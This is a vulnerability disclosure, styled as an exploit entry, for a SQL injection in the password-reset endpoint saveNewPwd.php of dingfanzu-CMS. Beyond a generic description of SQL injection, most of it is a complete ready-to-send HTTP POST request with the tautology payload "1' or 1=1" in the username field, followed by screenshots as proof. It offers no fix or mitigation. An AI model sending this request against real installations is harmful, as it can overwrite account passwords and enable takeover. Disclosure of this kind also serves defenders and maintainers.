# dingfanzu-CMS saveNewPwd.php username SQL-inject

**Exploit Title: dingfanzu-CMS saveNewPwd.php username SQL inject**

**Exploit Author: webraybtl@webray.com.cn inc**

**Vendor Homepage: https://github.com/geeeeeeeek/dingfanzu**

**Software Link: https://github.com/geeeeeeeek/dingfanzu**

**CMSName: dingfanzu-CMS**

**Tested on: Windows, Apache ,Mysql**

**Description**

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection dingfanzu-CMS does not filter the content correctly at the "saveNewPwd.php" username module, resulting in the generation of SQL injection.

    Payload used:

```
POST /ajax/saveNewPwd.php HTTP/1.1
Host: 192.168.67.123
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded

username=1' or 1=1&pwd=1&pwd2=1
```
![2024-09-23-10-34-32-image](https://github.com/user-attachments/assets/b297e806-d901-4728-8c15-c782dae1cb53)


## Proof of Concept

![2024-09-23-10-35-07-image](https://github.com/user-attachments/assets/631e130d-3fed-4602-b9ac-4d4924e8ddee)

![2024-09-23-10-37-34-image](https://github.com/user-attachments/assets/a633bb52-e4ea-4913-a209-a2d852175fa1)

![2024-09-23-10-39-03-image](https://github.com/user-attachments/assets/851da19f-f9aa-4c85-a2ff-9be6694c82e7)

![2024-09-23-10-39-21-image](https://github.com/user-attachments/assets/9c9b5776-2973-4de9-8476-8cc9939717c9)
